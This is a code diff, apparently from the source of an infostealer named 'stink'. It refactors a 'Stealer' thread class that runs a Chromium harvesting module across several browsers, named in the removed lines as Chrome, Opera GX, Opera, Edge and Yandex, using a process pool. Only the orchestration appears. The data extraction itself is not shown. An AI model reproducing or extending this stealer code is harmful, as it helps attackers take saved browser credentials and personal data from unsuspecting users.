@@ -4,10 +4,8 @@ from random import random
 from threading import Thread
 
 from stink.helpers import functions, MemoryStorage
-from stink.helpers.config import MultistealerConfig, Browsers
-from stink.modules import (
-    Chromium,
-)
+from stink.helpers.config import BrowsersData
+from stink.modules import Chromium
 
 
 class Stealer(Thread):
@@ -18,51 +16,7 @@ class Stealer(Thread):
     def __init__(self):
         Thread.__init__(self, name="S")
 
-        self.__config = MultistealerConfig()
         self.__storage = MemoryStorage()
-
-        self.__methods = [
-            {
-                "object": Chromium,
-                "arguments": (
-                    Browsers.CHROME.value,
-                    self.__config.BrowsersData[Browsers.CHROME]["path"],
-                    self.__config.BrowsersData[Browsers.CHROME]["process"],
-                ),
-            },
-            {
-                "object": Chromium,
-                "arguments": (
-                    Browsers.OPERA_GX.value,
-                    self.__config.BrowsersData[Browsers.OPERA_GX]["path"],
-                    self.__config.BrowsersData[Browsers.OPERA_GX]["process"],
-                ),
-            },
-            {
-                "object": Chromium,
-                "arguments": (
-                    Browsers.OPERA_DEFAULT.value,
-                    self.__config.BrowsersData[Browsers.OPERA_DEFAULT]["path"],
-                    self.__config.BrowsersData[Browsers.OPERA_DEFAULT]["process"],
-                ),
-            },
-            {
-                "object": Chromium,
-                "arguments": (
-                    Browsers.EDGE.value,
-                    self.__config.BrowsersData[Browsers.EDGE]["path"],
-                    self.__config.BrowsersData[Browsers.EDGE]["process"],
-                ),
-            },
-            {
-                "object": Chromium,
-                "arguments": (
-                    Browsers.YANDEX.value,
-                    self.__config.BrowsersData[Browsers.YANDEX]["path"],
-                    self.__config.BrowsersData[Browsers.YANDEX]["process"],
-                ),
-            },
-        ]
 
     def run(self) -> None:
         """
@@ -75,12 +29,12 @@ class Stealer(Thread):
         - None.
         """
         try:
-            with Pool(processes=self.__config.PoolSize) as pool:
+            with Pool(processes=5) as pool:
                 results = pool.starmap(
                     functions.run_process,
                     [
-                        (method["object"], method["arguments"])
-                        for method in self.__methods
+                        (Chromium, data)
+                        for data in BrowsersData
                     ],
                 )
             pool.close()
